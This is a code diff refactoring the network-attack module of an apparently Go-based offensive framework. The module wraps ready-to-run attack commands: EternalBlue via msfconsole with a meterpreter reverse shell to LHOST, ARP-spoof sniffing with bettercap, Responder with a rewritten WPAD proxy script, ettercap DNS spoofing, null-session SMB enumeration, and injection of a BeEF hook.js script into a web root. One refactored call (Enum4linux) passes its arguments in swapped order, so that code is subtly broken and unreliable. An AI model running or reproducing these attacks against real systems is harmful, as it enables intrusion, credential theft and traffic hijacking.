@@ -6,7 +6,6 @@ import(
     "os"
     "fmt"
     "time"
-    "bufio"
     "utils"
     "menus"
     "banners"
@@ -16,42 +15,31 @@ import(
     "strconv"
     "subprocess"
     "scriptures"
+    "path/filepath"
 )
 
 var(
-    FakeDns = "*"
-    LPort = "9999"
-    Mode = "single"
-    IFace  = "eth0"
-    Passwd = "Jesus"
-    Proxies = "none"
-    Spoofer = "ettercap"
-
-    LHost, _ = utils.GetDefaultIP()
-    scanner = bufio.NewScanner(os.Stdin)
-    Gateway, _ = utils.GetDefaultGatewayIP()
-    Name, Input, RHost, Target, Proxy, Function  string
-    CertDir, OutPutDir, KeyPath, CertPath, ToolsDir, RokyPath, WordListDir = utils.DirLocations()
+    Function string
 )
 
 var defaultValues = map[string]string{
 
-    "proxies": "",
-    "fakedns": "*",
-    "function": "",
-    "lport": "9999",
-    "iface": "eth0",
-    "mode": "single",
-    "passwd": "Jesus Christ",
-    "Spoofer": "ettercap",
+    "proxies":          "",
+    "fakedns":          "*",
+    "function":         "",
+    "lport":            "9999",
+    "iface":            "eth0",
+    "mode":             "single",
+    "passwd":           "Jesus Christ",
+    "utils.Spoofer":    "ettercap",
 
-    "lhost": LHost,
-    "rhost": RHost,
-    "rhosts": RHost,
-    "target": RHost,
-    "targets": RHost,
-    "gateway": Gateway,
-    "output": OutPutDir,
+    "lhost":    utils.LHost,
+    "rhost":    utils.RHost,
+    "rhosts":   utils.RHost,
+    "target":   utils.RHost,
+    "targets":  utils.RHost,
+    "gateway":  utils.Gateway,
+    "output":   utils.OutPutDir,
 }
 
 type stringMatcher struct {
@@ -61,9 +49,9 @@ type stringMatcher struct {
 
 func NetworksPentest() {
     for {
-        fmt.Printf("%s%s%safr3%s networks(%s%ssrc/pentest_%s.fn%s)%s > %s", bcolors.Endc, bcolors.Underl, bcolors.Bold, bcolors.Endc, bcolors.Bold, bcolors.BrightRed, Function, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
-        scanner.Scan()
-        Input = strings.TrimSpace(scanner.Text())
+        fmt.Printf("%s%s%safr%s%s networks(%s%ssrc/pentest_%s.fn%s)%s > %s", bcolors.Endc, bcolors.Underl, bcolors.Bold, subprocess.Version, bcolors.Endc, bcolors.Bold, bcolors.BrightRed, Function, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
+        utils.Scanner.Scan()
+        Input := strings.TrimSpace(utils.Scanner.Text())
         buildParts := strings.Fields(strings.ToLower(Input))
         if len(buildParts) == 0 {
             continue
@@ -118,7 +106,7 @@ func executeCommand(cmd string) bool {
 
         {[]string{"info"}, menus.HelpInfoNetworks},
         {[]string{"m", "menu"}, menus.MenuThree},
-        {[]string{"option", "options", "show option", "show options"}, func() {menus.NetworksOptions(Mode, IFace, RHost, Passwd, LHost, Gateway, Spoofer, Proxies, FakeDns, Function)}},
+        {[]string{"option", "options", "show option", "show options"}, func() {menus.NetworksOptions(utils.NeMode, utils.IFace, utils.RHost, utils.BeefPass, utils.LHost, utils.Gateway, utils.Spoofer, utils.Proxies, utils.FakeDns, Function)}},
 
         {[]string{"func", "funcs", "functions", "show func", "list funcs", "show funcs", "show function", "list function", "list functions", "show functions", "module", "modules", "list module", "show module", "list modules", "show modules", "show all", "list all"}, menus.ListInternalFunctions},
 
@@ -141,13 +129,13 @@ func executeCommand(cmd string) bool {
         {[]string{"? 6", "info 6", "help 6", "psniffer", "info psniffer", "help psniffer"}, menus.HelpInfoPSniffer},
 
         {[]string{"7", "run 7", "use 7", "exec 7", "start 7", "launch 7", "exploit 7", "execute 7", "run responda", "use responda", "exec responda", "start responda", "launch responda", "exploit responda", "execute responda"}, func() {NetworkPenFunctions("responda")}},
-        {[]string{"? 7", "info 7", "help 7", "responda", "info responda", "help responda"}, func() {menus.HelpInfoResponder(Mode, LPort, RHost, LHost)}},
+        {[]string{"? 7", "info 7", "help 7", "responda", "info responda", "help responda"}, func() {menus.HelpInfoResponder(utils.NeMode, utils.LPort, utils.RHost, utils.LHost)}},
 
         {[]string{"8", "run 8", "use 8", "exec 8", "start 8", "launch 8", "exploit 8", "execute 8", "run beefkill", "use beefkill", "exec beefkill", "start beefkill", "launch beefkill", "exploit beefkill", "execute beefkill"}, func() {NetworkPenFunctions("beefkill")}},
-        {[]string{"? 8", "info 8", "help 8", "beefkill", "info beefkill", "help beefkill"}, func() {menus.HelpInfoBeefKill(Mode, LPort, Spoofer, RHost, LHost)}},
+        {[]string{"? 8", "info 8", "help 8", "beefkill", "info beefkill", "help beefkill"}, func() {menus.HelpInfoBeefKill(utils.NeMode, utils.LPort, utils.Spoofer, utils.RHost, utils.LHost)}},
 
         {[]string{"9", "run 9", "use 9", "exec 9", "start 9", "launch 9", "exploit 9", "execute 9", "run toxssinx", "use toxssinx", "exec toxssinx", "start toxssinx", "launch toxssinx", "exploit toxssinx", "execute toxssinx"}, func() {NetworkPenFunctions("toxssinx")}},
-        {[]string{"? 9", "info 9", "help 9", "toxssinx", "info toxssinx", "help toxssinx"}, func() {menus.HelpInfoToxssInx(Mode, LPort, Spoofer, RHost, LHost)}},
+        {[]string{"? 9", "info 9", "help 9", "toxssinx", "info toxssinx", "help toxssinx"}, func() {menus.HelpInfoToxssInx(utils.NeMode, utils.LPort, utils.Spoofer, utils.RHost, utils.LHost)}},
 
         {[]string{"10", "run 10", "use 10", "exec 10", "start 10", "launch 10", "exploit 10", "execute 10", "run verses", "use verses", "exec verses", "start verses", "launch verses", "exploit verses", "execute verses"}, scriptures.ScriptureNarators},
         {[]string{"? 10", "verses", "info 10", "help 10", "info verses", "help verses"}, menus.HelpInfoVerses},
@@ -173,24 +161,24 @@ func handleSetCommand(parts []string) {
     key, value := parts[1], parts[2]
     setValues := map[string]*string{
 
-        "mode": &Mode,
-        "lhost": &LHost,
-        "lport": &LPort,
-        "iface": &IFace,
-        "rhost": &RHost,
-        "rhosts": &RHost,
-        "target": &RHost,
-        "targets": &RHost,
-        "proxies": &Proxy,
-        "passwd": &Passwd,
         "func": &Function,
         "funcs": &Function,
-        "gateway": &Gateway,
-        "fakedns": &FakeDns,
-        "spoofer": &Spoofer,
         "module": &Function,
         "function": &Function,
         "functions": &Function,
+        "mode": &utils.NeMode,
+        "lhost": &utils.LHost,
+        "lport": &utils.LPort,
+        "iface": &utils.IFace,
+        "rhost": &utils.RHost,
+        "rhosts": &utils.RHost,
+        "target": &utils.RHost,
+        "targets": &utils.RHost,
+        "proxies": &utils.Proxies,
+        "passwd": &utils.BeefPass,
+        "gateway": &utils.Gateway,
+        "fakedns": &utils.FakeDns,
+        "spoofer": &utils.Spoofer,
     }
 
     validKeys := make([]string, 0, len(setValues))
@@ -200,7 +188,7 @@ func handleSetCommand(parts []string) {
 
     if ptr, exists := setValues[key]; exists {
         *ptr = value
-        fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
+        fmt.Printf("%s%s%s -> %s\n", bcolors.Cyan, strings.ToUpper(key), bcolors.Endc, value)
         return
     }
 
@@ -265,45 +253,45 @@ func handleUnsetCommand(parts []string) {
     key := parts[1]
     unsetValues := map[string]*string{
 
-        "mode": &Mode,
-        "lhost": &LHost,
-        "lport": &LPort,
-        "iface": &IFace,
-        "rhost": &RHost,
-        "rhosts": &RHost,
-        "target": &RHost,
-        "targets": &RHost,
-        "proxies": &Proxy,
-        "passwd": &Passwd,
         "func": &Function,
         "funcs": &Function,
-        "gateway": &Gateway,
-        "fakedns": &FakeDns,
-        "spoofer": &Spoofer,
         "module": &Function,
         "function": &Function,
         "functions": &Function,
+        "mode": &utils.NeMode,
+        "lhost": &utils.LHost,
+        "lport": &utils.LPort,
+        "iface": &utils.IFace,
+        "rhost": &utils.RHost,
+        "rhosts": &utils.RHost,
+        "target": &utils.RHost,
+        "targets": &utils.RHost,
+        "proxies": &utils.Proxies,
+        "passwd": &utils.BeefPass,
+        "gateway": &utils.Gateway,
+        "fakedns": &utils.FakeDns,
+        "spoofer": &utils.Spoofer,
     }
 
     defaultValues := map[string]string{
-        "mode":     "",
-        "lhost":    "",
-        "lport":    "",
-        "iface":    "",
-        "rhost":    "",
-        "rhosts":   "",
-        "target":   "",
-        "targets":  "",
-        "proxies":  "",
-        "passwd":   "",
-        "func":     "",
-        "funcs":    "",
-        "gateway":  "",
-        "fakedns":  "",
-        "spoofer":  "",
-        "module":   "",
-        "function": "",
-        "functions": "",
+        "mode":         "",
+        "lhost":        "",
+        "lport":        "",
+        "iface":        "",
+        "rhost":        "",
+        "rhosts":       "",
+        "target":       "",
+        "targets":      "",
+        "proxies":      "",
+        "passwd":       "",
+        "func":         "",
+        "funcs":        "",
+        "gateway":      "",
+        "fakedns":      "",
+        "spoofer":      "",
+        "module":       "",
+        "function":     "",
+        "functions":    "",
     }
 
     validKeys := make([]string, 0, len(unsetValues))
@@ -313,7 +301,7 @@ func handleUnsetCommand(parts []string) {
 
     if ptr, exists := unsetValues[key]; exists {
         *ptr = defaultValues[key]
-        fmt.Printf("%s => %s\n", strings.ToUpper(key), "Null")
+        fmt.Printf("%s -> %s\n", strings.ToUpper(key), "Null")
         return
     }
 
@@ -376,37 +364,81 @@ func executeFunction() {
         fmt.Printf("\n%s[!] %sNo MODULE was set. Use %s'show modules' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    NetworkPenFunctions(Function, IFace, Gateway, LHost, RHost, Mode, FakeDns, Spoofer)
+    NetworkPenFunctions(Function, utils.IFace, utils.Gateway, utils.LHost, utils.RHost, utils.NeMode, utils.FakeDns, utils.Spoofer)
 }
 
 func NetworkPenFunctions(Function string, args ...interface{}) {
-    if Proxy != "" {
-        fmt.Printf("PROXIES => %s\n", Proxy)
-        if err := utils.SetProxy(Proxy); err != nil {
+    os.MkdirAll(utils.NetworkLogs, os.ModePerm)
+
+    if utils.Proxies != "" {
+        menus.PrintSelected(menus.PrintOptions{
+            MODE: utils.NeMode,
+            IFACE: utils.IFace,
+            LPORT: utils.LPort,
+            HPORT: utils.HPort,
+            RHOST: utils.RHost,
+            LHOST: utils.LHost,
+            //DISTRO: utils.Distro,
+            //SCRIPT: utils.Script,
+            OUTPUTLOGS: utils.NetworkLogs,
+            PROXIES: utils.Proxies,
+            FUNCTION: Function,
+            //RECONDIR: utils.ReconDir,
+            //LISTENER: utils.Listener,
+            PROTOCOL: utils.Protocol,
+            //TOOLSDIR: utils.ToolsDir,
+            //INNERICON: utils.InnerIcon,
+            //OUTERICON: utils.OuterIcon,
+            //BUILDNAME: utils.BuildName,
+            //OBFUSCATOR: utils.Obfuscator,
+        }, true, false)
+
+        if err := utils.SetProxy(utils.Proxies); err != nil {
             //
         }
+    } else {
+        menus.PrintSelected(menus.PrintOptions{
+            MODE: utils.NeMode,
+            IFACE: utils.IFace,
+            LPORT: utils.LPort,
+            HPORT: utils.HPort,
+            RHOST: utils.RHost,
+            LHOST: utils.LHost,
+            //DISTRO: utils.Distro,
+            //SCRIPT: utils.Script,
+            OUTPUTLOGS: utils.NetworkLogs,
+            FUNCTION:    Function,
+            //RECONDIR: utils.ReconDir,
+            //LISTENER: utils.Listener,
+            PROTOCOL: utils.Protocol,
+            //TOOLSDIR: utils.ToolsDir,
+            //INNERICON: utils.InnerIcon,
+            //OUTERICON: utils.OuterIcon,
+            //BUILDNAME: utils.BuildName,
+            //OBFUSCATOR: utils.Obfuscator,
+        }, true, false)
     }
 
     commands := map[string]func(){
         "discover": func() {DiscoverIps()},
-        "portscan": func() {NmapPortScan(RHost)},
-        "vulnscan": func() {NmapVulnScan(RHost)},
-        "enumscan": func() {SmbVulnScan(RHost); EnumNxc(RHost); Enum4linux(RHost); SmbMapScan(RHost)},
-        "smbexplo": func() {SmbVulnScan(RHost); SmbExploit(RHost, LHost, LPort)},
-        "psniffer": func() {PacketSniffer(Mode, RHost)},
-        "responda": func() {KillerResponder(IFace, LHost)},
-        "beefkill": func() {BeefKill(Spoofer, Mode, LHost, RHost, IFace, Passwd, FakeDns, Gateway)},
-        "toxssinx": func() {ToxssInx(RHost)},
+        "portscan": func() {NmapPortScan(utils.RHost)},
+        "vulnscan": func() {NmapVulnScan(utils.RHost)},
+        "enumscan": func() {SmbVulnScan(utils.RHost); EnumNxc(utils.RHost); Enum4linux(utils.RHost); SmbMapScan(utils.RHost)},
+        "smbexplo": func() {SmbVulnScan(utils.RHost); SmbExploit(utils.RHost, utils.LHost, utils.LPort)},
+        "psniffer": func() {PacketSniffer(utils.NeMode, utils.RHost)},
+        "responda": func() {KillerResponder(utils.IFace, utils.LHost)},
+        "beefkill": func() {BeefKill(utils.Spoofer, utils.NeMode, utils.LHost, utils.RHost, utils.IFace, utils.BeefPass, utils.FakeDns, utils.Gateway)},
+        "toxssinx": func() {ToxssInx(utils.RHost)},
 
         "1": func() {DiscoverIps()},
-        "2": func() {NmapPortScan(RHost)},
-        "3": func() {NmapVulnScan(RHost)},
-        "4": func() {SmbVulnScan(RHost); EnumNxc(RHost); Enum4linux(RHost); SmbMapScan(RHost)},
-        "5": func() {SmbVulnScan(RHost); SmbExploit(RHost, LHost, LPort)},
-        "6": func() {PacketSniffer(Mode, RHost)},
-        "7": func() {KillerResponder(IFace, LHost)},
-        "8": func() {BeefKill(Spoofer, Mode, LHost, RHost, IFace, Passwd, FakeDns, Gateway)},
-        "9": func() {ToxssInx(RHost)},
+        "2": func() {NmapPortScan(utils.RHost)},
+        "3": func() {NmapVulnScan(utils.RHost)},
+        "4": func() {SmbVulnScan(utils.RHost); EnumNxc(utils.RHost); Enum4linux(utils.RHost); SmbMapScan(utils.RHost)},
+        "5": func() {SmbVulnScan(utils.RHost); SmbExploit(utils.RHost, utils.LHost, utils.LPort)},
+        "6": func() {PacketSniffer(utils.NeMode, utils.RHost)},
+        "7": func() {KillerResponder(utils.IFace, utils.LHost)},
+        "8": func() {BeefKill(utils.Spoofer, utils.NeMode, utils.LHost, utils.RHost, utils.IFace, utils.BeefPass, utils.FakeDns, utils.Gateway)},
+        "9": func() {ToxssInx(utils.RHost)},
     }
 
     textCommands := []string{"discover", "portscan", "vulnscan", "enumscan", "smbexplo", "psniffer", "responda", "beefkill", "toxssinx"}
@@ -448,164 +480,155 @@ func DiscoverIps() {
 }
 
 func NaabuPortScan(RHost string) {
-    if RHost == "" {
+    if utils.RHost == "" {
         fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    fmt.Printf("\n%s[>] %sport scan target: %s...\n", bcolors.Green, bcolors.Endc, RHost)
-    subprocess.Popen(`naabu -host %s`, RHost)
+    fmt.Printf("\n%s[>] %sport scan target: %s...\n", bcolors.Green, bcolors.Endc, utils.RHost)
+    subprocess.Popen(`naabu -host %s`, utils.RHost)
     return
 }
 
 func NmapPortScan(RHost string) {
-    if RHost == "" {
+    if utils.RHost == "" {
         fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    fmt.Printf("\n%s[>] %sport scan target: %s...\n", bcolors.Green, bcolors.Endc, RHost)
-    subprocess.Popen(`nmap -sV -sC -O -T4 -n -v -p- %s`, RHost)
+    fmt.Printf("\n%s[>] %sport scan target: %s...\n", bcolors.Green, bcolors.Endc, utils.RHost)
+    subprocess.Popen(`nmap -sV -sC -O -T4 -n -v -p- %s`, utils.RHost)
     return
 }
 
 func NmapVulnScan(RHost string) {
-    if RHost == "" {
+    if utils.RHost == "" {
         fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    fmt.Printf("\n%s[>] %svuln scan target: %s...\n", bcolors.Green, bcolors.Endc, RHost)
-    subprocess.Popen(`nmap --open -v -T4 -n -sSV -p- --script="vuln and safe" --reason %s`, RHost)
+    fmt.Printf("\n%s[>] %svuln scan target: %s...\n", bcolors.Green, bcolors.Endc, utils.RHost)
+    subprocess.Popen(`nmap --open -v -T4 -n -sSV -p- --script="vuln and safe" --reason %s`, utils.RHost)
     return
 }
 
 func SmbVulnScan(RHost string) {
-    if RHost == "" {
+    if utils.RHost == "" {
         fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    fmt.Printf("\n%s[>] %sSMB vuln scan target: %s...\n", bcolors.Green, bcolors.Endc, RHost)
-    subprocess.Popen(`nmap -sV -v --script "smb-vuln*" -p139,445 %s`, RHost)
+    fmt.Printf("\n%s[>] %sSMB vuln scan target: %s...\n", bcolors.Green, bcolors.Endc, utils.RHost)
+    subprocess.Popen(`nmap -sV -v --script "smb-vuln*" -p139,445 %s`, utils.RHost)
     return
 }
 
 func Enum4linux(RHost string) {
-    if RHost == "" {
+    if utils.RHost == "" {
         fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    fmt.Printf("\n%s[>] %srunning smb recon on target: %s...\n", bcolors.Green, bcolors.Endc, RHost)
-    subprocess.Popen(`cd /root/.afr3/africana-base/networks/enum4linux-ng; python3 enum4linux-ng.py -A -v %s`, RHost)
+    fmt.Printf("\n%s[>] %srunning smb recon on target: %s...\n", bcolors.Green, bcolors.Endc, utils.RHost)
+    subprocess.Popen(`cd %s/networks/enum4linux-ng; python3 enum4linux-ng.py -A -v %s`, utils.RHost, utils.ToolsDir)
     return
 }
 
 func EnumNxc(RHost string) {
-    if RHost == "" {
+    if utils.RHost == "" {
         fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    fmt.Printf("\n%s[>] %srunning smb recon on target: %s...\n", bcolors.Green, bcolors.Endc, RHost)
-    subprocess.Popen(`nxc smb %s -u '' -p '' --verbose --groups --local-groups --loggedon-s --rid-brute --sessions --s --shares --pass-pol`, RHost)
+    fmt.Printf("\n%s[>] %srunning smb recon on target: %s...\n", bcolors.Green, bcolors.Endc, utils.RHost)
+    subprocess.Popen(`nxc smb %s -u '' -p '' --verbose --groups --local-groups --loggedon-s --rid-brute --sessions --s --shares --pass-pol`, utils.RHost)
     return
 }
 
 func SmbMapScan(RHost string) {
-    if RHost == "" {
+    if utils.RHost == "" {
         fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    fmt.Printf("\n%s[>] %srunning smb recon on target: %s...\n", bcolors.Green, bcolors.Endc, RHost)
-    subprocess.Popen(`smbmap -u '' -p '' -r --depth 5 -H %s; smbmap --no-banner -u 'guest' -p '' -r --depth 5 -H %s`, RHost, RHost)
+    fmt.Printf("\n%s[>] %srunning smb recon on target: %s...\n", bcolors.Green, bcolors.Endc, utils.RHost)
+    subprocess.Popen(`smbmap -u '' -p '' -r --depth 5 -H %s; smbmap --no-banner -u 'guest' -p '' -r --depth 5 -H %s`, utils.RHost, utils.RHost)
     return
 }
 
 func RpcEnumScan(RHost string) {
-    if RHost == "" {
+    if utils.RHost == "" {
         fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    fmt.Printf("\n%s[>] %sperforming rpc recon target: %s...\n", bcolors.Green, bcolors.Endc, RHost)
-    subprocess.Popen(`rpcclient -U "" -N %s`, RHost)
+    fmt.Printf("\n%s[>] %sperforming rpc recon target: %s...\n", bcolors.Green, bcolors.Endc, utils.RHost)
+    subprocess.Popen(`rpcclient -U "" -N %s`, utils.RHost)
     return
 }
 
 func ToxssInx(RHost string) {
-    fmt.Printf("\n%s[>] %sperforming M.I.B attacks: %s...\n", bcolors.Green, bcolors.Endc, RHost)
-    subprocess.Popen(`cd %s/networks/toxssin/; python3 toxssin.py -u https://%s -c %s -k %s -p %s -v`, ToolsDir, LHost, CertPath, KeyPath, "443")
+    fmt.Printf("\n%s[>] %sperforming M.I.B attacks: %s...\n", bcolors.Green, bcolors.Endc, utils.RHost)
+    subprocess.Popen(`cd %s/networks/toxssin/; python3 toxssin.py -u https://%s -c %s -k %s -p %s -v`, utils.ToolsDir, utils.LHost, utils.CertPath, utils.KeyPath, "443")
     return
 }
 
-func SmbExploit(RHost string, LHost string, LPort string) {
-    if RHost == "" {
+func SmbExploit(RHost, LHost, LPort string) {
+    if utils.RHost == "" {
         fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    fmt.Printf("\n%s[>] %sexploiting smb on target: %s...\n", bcolors.Green, bcolors.Endc, RHost)
-    fmt.Printf("\nRHOST => %s\nLHOST => %s\nLPORT => %s\n", RHost, LHost, LPort)
-    subprocess.Popen(`msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j'`, RHost, LHost, LPort)
+    fmt.Printf("\n%s[>] %sexploiting smb on target: %s...\n", bcolors.Green, bcolors.Endc, utils.RHost)
+    subprocess.Popen(`msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j'`, utils.RHost, utils.LHost, utils.LPort)
 }
 
-func PacketSniffer(Mode string, RHost string) {
+func PacketSniffer(NeMode, RHost string) {
     if _, err := exec.LookPath("bettercap"); err != nil {
         fmt.Printf("\n%s[!] %sBettercap isn't installed, install it with %s'sudo apt install responder.'%s\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    if RHost == "" {
+    if utils.RHost == "" {
         fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    switch strings.ToLower(Mode) {
+    switch strings.ToLower(utils.NeMode) {
     case "single":
-        fmt.Printf("\nRHOST => %s\nMODE => %s\n", RHost, Mode)
-        subprocess.Popen(`bettercap -caplet /root/.afr3/africana-base/networks/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active'`, RHost)
+        subprocess.Popen(`bettercap -caplet %s/networks/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active'`, utils.ToolsDir, utils.RHost)
     case "all":
-        fmt.Printf("\nRHOST => %s\nMODE => %s\n", RHost, Mode)
-        subprocess.Popen(`bettercap -caplet /root/.afr3/africana-base/networks/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active'`)
+        subprocess.Popen(`bettercap -caplet %s/networks/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active'`, utils.ToolsDir)
     default:
-        fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightRed, Mode, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
+        fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightRed, utils.NeMode, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
 }
 
-func KillerResponder(IFace string, LHost string) {
-    menus.PrintSelected(menus.PrintOptions{
-        IFACE:    IFace,
-        LHOST:    LHost,
-    }, true, false)
-
-    filePath := "/root/.afr3/africana-base/networks/responder/Responder.conf.bak_africana"
-
+func KillerResponder(IFace, LHost string) {
+    filePath :=  filepath.Join(utils.ToolsDir, "/networks/responder/Responder.conf.bak_africana")
     if _, err := os.Stat(filePath); os.IsNotExist(err) {
-        subprocess.Popen(`cp /root/.afr3/africana-base/networks/responder/Responder.conf /root/.afr3/africana-base/networks/responder/Responder.conf.bak_africana`)
-        newString  := fmt.Sprintf(`WPADScript = function FindProxyForURL(url, host)[if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY %s:3128; PROXY %s:3141; DIRECT';]'`, LHost, LHost)
+        subprocess.Popen("cp %s/networks/responder/Responder.conf %s/networks/responder/Responder.conf.bak_africana", utils.ToolsDir, utils.ToolsDir)
+        newString  := fmt.Sprintf(`WPADScript = function FindProxyForURL(url, host)[if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY %s:3128; PROXY %s:3141; DIRECT';]'`, utils.LHost, utils.LHost)
+
         filesToReplacements := map[string]map[string]string{
-            "/root/.afr3/africana-base/networks/responder/Responder.conf": {
-            `WPADScript =`: newString,
+            filepath.Join(utils.ToolsDir, "/networks/responder/Responder.conf"): {
+            "WPADScript =": newString,
             },
         }
 
         utils.Editors(filesToReplacements)
 
-        subprocess.Popen(`cd /root/.afr3/africana-base/networks/responder/; python3 Responder.py -I %s -Pdv`, IFace)
-        subprocess.Popen(`rm -rf /root/.afr3/africana-base/networks/responder/Responder.conf; mv /root/.afr3/africana-base/networks/responder/Responder.conf.bak_africana /root/.afr3/africana-base/networks/responder/Responder.conf`)
+        subprocess.Popen(`cd %s/networks/responder/; python3 Responder.py -I %s -Pdv`, utils.ToolsDir, utils.IFace)
+        subprocess.Popen(`rm -rf %s/networks/responder/Responder.conf; mv %s/networks/responder/Responder.conf.bak_africana %s/networks/responder/Responder.conf`, utils.ToolsDir, utils.ToolsDir, utils.ToolsDir)
 
     } else {
-        subprocess.Popen(`cd /root/.afr3/africana-base/networks/responder/; python3 Responder.py -I %s -Pdv`, IFace)
-        subprocess.Popen(`rm -rf /root/.afr3/africana-base/networks/responder/Responder.conf; mv /root/.afr3/africana-base/networks/responder/Responder.conf.bak_africana /root/.afr3/africana-base/networks/responder/Responder.conf`)
+        subprocess.Popen("cd %s/networks/responder/; python3 Responder.py -I %s -Pdv", utils.ToolsDir, utils.IFace)
+        subprocess.Popen("rm -rf %s/networks/responder/Responder.conf; mv %s/networks/responder/Responder.conf.bak_africana %s/networks/responder/Responder.conf", utils.ToolsDir, utils.ToolsDir, utils.ToolsDir)
     }
 }
 
-func BeefEttercap(Mode string, LHost string, RHost string, IFace string, Passwd string, FakeDns string, Gateway string) {
-    if RHost == "" {
+func BeefEttercap(NeMode, LHost, RHost, IFace, BeefPasswd, FakeDns, Gateway string) {
+    if utils.RHost == "" {
         fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    switch strings.ToLower(Mode) {
+    switch strings.ToLower(utils.NeMode) {
     case "single":
-        fmt.Printf("\nRHOST => %s\nMODE => %s\n", RHost, Mode)
         filePath := "/etc/beef-xss/config.yaml.bak_africana"
         if _, err := os.Stat(filePath); os.IsNotExist(err) {
             subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
 
-            newString := fmt.Sprintf(`passwd: "%s"`, Passwd)
+            newString := fmt.Sprintf(`passwd: "%s"`,utils.BeefPass)
             filesToReplacements := map[string]map[string]string{
                 "/etc/beef-xss/config.yaml": {
                 `passwd: "beef"`: newString,
@@ -648,7 +671,7 @@ func BeefEttercap(Mode string, LHost string, RHost string, IFace string, Passwd 
             filePathT := "/etc/ettercap/etter.dns.bak_africana"
             if _, err := os.Stat(filePathT); os.IsNotExist(err) {
                 subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
-                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n%s%s%s", FakeDns, " A ", LHost)
+                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n%s%s%s", utils.FakeDns, " A ", utils.LHost)
                 filesToReplacements := map[string]map[string]string{
                     "/etc/ettercap/etter.dns": {
                         `# vim:ts=8:noexpandtab`: newString,
@@ -660,7 +683,7 @@ func BeefEttercap(Mode string, LHost string, RHost string, IFace string, Passwd 
             fileXPath := "/var/www/html/.Files"
             if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                 subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
-                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, LHost)
